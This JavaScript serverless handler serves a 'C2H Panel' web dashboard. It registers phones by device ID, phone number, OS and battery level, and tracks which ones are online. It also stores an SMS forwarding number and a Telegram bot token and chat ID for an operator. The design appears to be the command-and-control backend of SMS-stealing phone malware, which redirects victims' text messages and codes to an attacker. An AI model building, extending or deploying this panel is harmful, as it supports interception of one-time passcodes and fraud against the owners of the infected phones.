// ✅ SIMPLE WORKING SERVER
let devices = [];
let settings = {};

export default async function handler(req, res) {
  // ✅ FIX: Always set response headers FIRST
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // ✅ Handle OPTIONS for CORS
  if (req.method === 'OPTIONS') {
    res.statusCode = 200;
    res.end();
    return;
  }
  
  const { url, method } = req;
  
  try {
    // ✅ Parse request body
    let body = {};
    if (method === 'POST' || method === 'PUT') {
      const chunks = [];
      for await (const chunk of req) {
        chunks.push(chunk);
      }
      const buffer = Buffer.concat(chunks);
      if (buffer.length > 0) {
        try {
          body = JSON.parse(buffer.toString());
        } catch (e) {
          console.log('JSON parse error:', e.message);
        }
      }
    }
    
    // ✅ API ENDPOINTS
    const now = () => new Date().toISOString();
    
    // 1. DEVICE REGISTER
    if (url === '/api/device/register' && method === 'POST') {
      const { device_id, device_name, os_version, battery_level, phone_number } = body;
      const currentTime = now();
      
      const index = devices.findIndex(d => d.device_id === device_id);
      
      if (index > -1) {
        devices[index] = {
          ...devices[index],
          device_name: device_name || devices[index].device_name,
          os_version: os_version || devices[index].os_version,
          phone_number: phone_number || devices[index].phone_number,
          battery_level: battery_level || devices[index].battery_level,
          last_seen: currentTime
        };
      } else {
        devices.push({
          device_id,
          device_name: device_name || 'Unknown',
          os_version: os_version || 'Unknown',
          phone_number: phone_number || 'N/A',
          battery_level: battery_level || 0,
          last_seen: currentTime,
          created_at: currentTime
        });
      }
      
      return res.end(JSON.stringify({ status: 'success' }));
    }
    
    // 2. GET DEVICES
    if (url === '/api/devices' && method === 'GET') {
      const result = devices.map(device => ({
        device_id: device.device_id,
        device_name: device.device_name,
        os_version: device.os_version,
        phone_number: device.phone_number,
        battery_level: device.battery_level,
        last_seen: device.last_seen,
        created_at: device.created_at,
        is_online: (Date.now() - new Date(device.last_seen).getTime()) < 20000
      }));
      
      return res.end(JSON.stringify(result));
    }
    
    // 3. DELETE DEVICE
    if (url.startsWith('/api/device/') && method === 'DELETE') {
      const deviceId = url.split('/')[3];
      devices = devices.filter(d => d.device_id !== deviceId);
      return res.end(JSON.stringify({ status: 'success' }));
    }
    
    // 4. SMS FORWARD NUMBER
    if (url === '/api/config/sms_forward') {
      if (method === 'POST') {
        settings.sms_forward_number = body.forward_number || '';
        return res.end(JSON.stringify({ status: 'success' }));
      }
      if (method === 'GET') {
        return res.end(JSON.stringify({ 
          forward_number: settings.sms_forward_number || '' 
        }));
      }
    }
    
    // 5. TELEGRAM SETTINGS
    if (url === '/api/config/telegram') {
      if (method === 'POST') {
        settings.telegram_bot_token = body.telegram_bot_token || '';
        settings.telegram_chat_id = body.telegram_chat_id || '';
        return res.end(JSON.stringify({ status: 'success' }));
      }
      if (method === 'GET') {
        return res.end(JSON.stringify({
          telegram_bot_token: settings.telegram_bot_token || '',
          telegram_chat_id: settings.telegram_chat_id || ''
        }));
      }
    }
    
    // 6. SERVE HTML PANEL
    if (url === '/' || url === '/index.html') {
      res.setHeader('Content-Type', 'text/html');
      
      const html = `<!DOCTYPE html>
<html>
<head>
    <title>C2H Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #1a1a1a; color: white; padding: 20px; font-family: Arial; }
        .header { text-align: center; padding: 20px 0; }
        h1 { color: #3a86ff; }
        .btn { width: 100%; padding: 15px; margin: 10px 0; background: #3a86ff; color: white; border: none; border-radius: 8px; font-size: 16px; }
        .btn:hover { background: #2a76ef; }
        .device { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #3a86ff; }
        .online { color: #2ecc71; }
        .offline { color: #e74c3c; }
        .delete-btn { background: #e74c3c; color: white; border: none; padding: 5px 10px; float: right; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🚀 C2H ADMIN PANEL</h1>
        <p>✅ Server is working perfectly!</p>
    </div>
    
    <button class="btn" onclick="updateForward()">📞 UPDATE FORWARD NUMBER</button>
    <button class="btn" onclick="updateTelegram()">🤖 UPDATE TELEGRAM</button>
    
    <h3>📱 DEVICES LIST</h3>
    <div id="deviceList">Loading devices...</div>
    
    <script>
        const API_BASE = window.location.origin;
        
        async function loadDevices() {
            try {
                const res = await fetch(API_BASE + '/api/devices');
                const devices = await res.json();
                
                let html = '';
                devices.forEach(device => {
                    html += \`
                    <div class="device">
                        <strong>\${device.device_name}</strong>
                        <span class="\${device.is_online ? 'online' : 'offline'}">
                            \${device.is_online ? '🟢 ONLINE' : '🔴 OFFLINE'}
                        </span>
                        <button class="delete-btn" onclick="deleteDevice('\${device.device_id}')">DELETE</button>
                        <br>
                        📱 ID: \${device.device_id}<br>
                        🔋 Battery: \${device.battery_level}%<br>
                        📞 Number: \${device.phone_number}<br>
                        🕐 Last Seen: \${device.last_seen}
                    </div>\`;
                });
                
                document.getElementById('deviceList').innerHTML = html || 'No devices found';
            } catch (error) {
                document.getElementById('deviceList').innerHTML = 'Error loading devices';
            }
        }
        
        function updateForward() {
            const number = prompt('Enter forwarding number:');
            if (!number) return;
            
            fetch(API_BASE + '/api/config/sms_forward', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ forward_number: number })
            }).then(() => alert('✅ Updated!'));
        }
        
        function updateTelegram() {
            const token = prompt('Bot Token:');
            const chatId = prompt('Chat ID:');
            
            fetch(API_BASE + '/api/config/telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ telegram_bot_token: token, telegram_chat_id: chatId })
            }).then(() => alert('✅ Updated!'));
        }
        
        function deleteDevice(deviceId) {
            if (confirm('Delete this device?')) {
                fetch(API_BASE + '/api/device/' + deviceId, { 
                    method: 'DELETE' 
                }).then(() => loadDevices());
            }
        }
        
        // Auto refresh
        setInterval(loadDevices, 3000);
        loadDevices();
    </script>
</body>
</html>`;
      
      return res.end(html);
    }
    
    // 7. 404 - Not Found
    res.statusCode = 404;
    return res.end(JSON.stringify({ error: 'Not found' }));
    
  } catch (error) {
    console.error('Server error:', error);
    res.statusCode = 500;
    return res.end(JSON.stringify({ 
      error: 'Internal server error',
      message: error.message 
    }));
  }
}
